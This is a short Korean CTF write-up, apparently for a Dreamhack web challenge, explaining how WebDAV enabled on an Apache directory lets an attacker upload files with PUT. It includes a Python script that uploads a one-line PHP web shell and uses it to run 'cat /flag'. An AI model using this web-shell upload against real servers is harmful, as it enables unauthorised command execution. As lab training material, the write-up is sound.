<img width="560" height="69" alt="image" src="https://github.com/user-attachments/assets/bb8acbce-c243-4553-b5f7-845cf27b1145" /># 문제 설명
<img width="224" height="112" alt="image" src="https://github.com/user-attachments/assets/82c28276-dbfe-4c23-9358-a50c592166cd" />

# 목표
문제를 통해 Flag 획득

# 공격 표면 분석
## 000-default.conf
<img width="396" height="359" alt="image" src="https://github.com/user-attachments/assets/7c25018b-d7e8-4220-a34c-575ae1ed7ba7" />

위 사진에서 `<Directory /var/www/html/user/>`에 `DAV On`이 활성화되어있는 것을 확인할 수 있다.<br>
`Dav On`이란 원격으로 서버 파일을 임의로
읽고, 생성하고, 수정하고, 삭제할 수 있도록 지원하는 프로토콜이다 .

## .htaccess

<img width="233" height="60" alt="image" src="https://github.com/user-attachments/assets/df854bf2-4f24-479a-987c-a04d18457c07" /><br>
`.htaccess`에서는 `DELETE`메서드만 차단하고 있다.

<img width="454" height="134" alt="image" src="https://github.com/user-attachments/assets/b3c95bf5-aeea-46bc-8f35-5303cce75d64" /><br>

```python
import requests

url = "http://host3.dreamhack.games:19563/user/admin.json"

res = requests.options(url)

print("Allow method : ", res.headers.get("Allow"))
```

<img width="556" height="20" alt="image" src="https://github.com/user-attachments/assets/46b4b13b-94cb-498b-b5c4-69b1b5033faa" /><br>
허용 메서드로 수많은 메서드가 포함되어 있으며 PUT 메서드 또한 허용되어 있으므로 웹쉘 업로드가 가능해 보인다

# 익스플로잇
```python
import requests

URL = "http://host3.dreamhack.games:11749/user/shell.php"

payload = "<?php system($_GET['cmd']); ?>"

res = requests.put(URL, data=payload)
```
한번 cmd 파라미터를 추가해보면<br>
<img width="560" height="69" alt="image" src="https://github.com/user-attachments/assets/e0b74cdc-c1a2-48b5-ad52-ffcf15f40b55" /><br>
웹쉘이 정상적으로 들어간 것을 볼 수 있다.

## 페이로드
웹쉘로 
```html
cat /flag
```
